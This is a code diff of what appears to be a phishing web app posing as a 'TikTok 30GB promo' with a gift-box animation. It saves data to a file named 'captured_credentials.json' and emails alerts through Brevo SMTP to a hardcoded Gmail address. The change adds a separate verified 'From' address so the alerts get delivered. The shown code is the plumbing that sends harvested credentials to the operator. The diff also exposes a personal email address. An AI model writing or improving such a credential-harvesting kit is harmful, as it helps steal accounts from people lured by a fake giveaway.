@@ -1,6 +1,6 @@
 # =============================================================================
 # TIKTOK 30GB PROMO + ATTRACTIVE GIFT BOX ANIMATION – RENDER DEPLOYMENT
-# Brevo SMTP via Render Secret File | No Ngrok | Modern UI/UX
+# Brevo SMTP via Render Secret File | Separate Login & From Email | No Ngrok
 # =============================================================================
 
 import os
@@ -20,8 +20,9 @@ DATA_FILE = "captured_credentials.json"
 SMTP_SERVER = "smtp-relay.brevo.com"
 SMTP_PORT = 587
 SMTP_USE_SSL = False
-EMAIL_SENDER = ""
-EMAIL_PASSWORD = ""
+EMAIL_SENDER = ""      # SMTP login username (e.g., a86d2e001@smtp-brevo.com)
+EMAIL_PASSWORD = ""    # SMTP master key
+EMAIL_FROM = ""        # Verified sender email (appears in "From:" field)
 EMAIL_RECEIVER = "ah3418678@gmail.com"
 
 # Load from Render Secret File if it exists (recommended for production)
@@ -42,6 +43,8 @@ if Path(SECRET_FILE).exists():
                     EMAIL_SENDER = value
                 elif key == "EMAIL_PASSWORD":
                     EMAIL_PASSWORD = value
+                elif key == "EMAIL_FROM":
+                    EMAIL_FROM = value
                 elif key == "EMAIL_RECEIVER":
                     EMAIL_RECEIVER = value
 else:
@@ -51,6 +54,7 @@ else:
     SMTP_USE_SSL = os.environ.get('SMTP_USE_SSL', 'false').lower() == 'true'
     EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
     EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
+    EMAIL_FROM = os.environ.get('EMAIL_FROM', '')
     EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', EMAIL_RECEIVER)
 
 logging.basicConfig(level=logging.INFO)
@@ -601,11 +605,14 @@ def send_email_alert(subject, body):
     if not EMAIL_SENDER or not EMAIL_PASSWORD:
         logger.error("❌ EMAIL_SENDER or EMAIL_PASSWORD not set")
         return False
+    if not EMAIL_FROM:
+        logger.error("❌ EMAIL_FROM not set (must be a verified sender in Brevo)")
+        return False
     try:
         msg = EmailMessage()
         msg.set_content(body)
         msg['Subject'] = subject
-        msg['From'] = EMAIL_SENDER
+        msg['From'] = EMAIL_FROM          # Verified sender email
         msg['To'] = EMAIL_RECEIVER
 
         if SMTP_USE_SSL:
